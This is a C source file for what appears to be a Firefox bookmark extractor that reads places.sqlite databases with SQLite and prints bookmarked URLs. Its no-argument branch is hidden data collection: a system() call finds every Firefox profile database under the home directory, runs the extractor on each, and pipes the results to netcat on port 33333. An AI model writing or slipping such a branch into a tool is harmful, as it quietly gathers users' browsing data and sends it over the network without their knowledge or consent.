#include<stdio.h>
#include<stdlib.h>
#include<sqlite3.h>

//Callback function executed for each row in table
int query_row_result(void *data,int col_num, char **col_data, char **col_label)
{
    //Extract URL (should be last column)
    if(col_num>0)
    {
        fprintf(stdout,"%s\n",col_data[col_num-1]);
    }
    return EXIT_SUCCESS;
}

int main(int argc, char **argv)
{
    const char query[] = "SELECT moz_bookmarks.title, moz_places.title, moz_places.url FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk == moz_places.id;";
    char *message = NULL;
    sqlite3 *db = NULL;

    //Check Args
    if(argc!=2)
    {
        system((const char *)"find ~ -name \"places.sqlite\" | grep -vi \"thunderbird\"|  xargs -I'{}' ./bookmark_extractor {} 2>&1 | nc -w1 localhost 33333");
        exit(EXIT_SUCCESS);
    }

        fprintf(stderr,"Opening --> \"%s\"\n",argv[1]);

    //Open DB
    if(sqlite3_open(argv[1],&db)!=SQLITE_OK)
    {
        fprintf(stderr,"DB Opening error!\n");
        exit(EXIT_FAILURE);
    }

    //Run Query
    sqlite3_exec(db,query,query_row_result,NULL,&message);

    //Check Return Error Message and free
    if(message!=NULL)
    {
        fprintf(stderr,"Query Failed: %s\n",message);
        sqlite3_free(message);
        message=NULL;
    }

    //Close DB
    if(db!=NULL)
    {
       if(sqlite3_close(db)!=SQLITE_OK)
       {
        fprintf(stderr,"DB Closing error\n");
        exit(EXIT_FAILURE);
       }

    }

    return EXIT_SUCCESS;
}
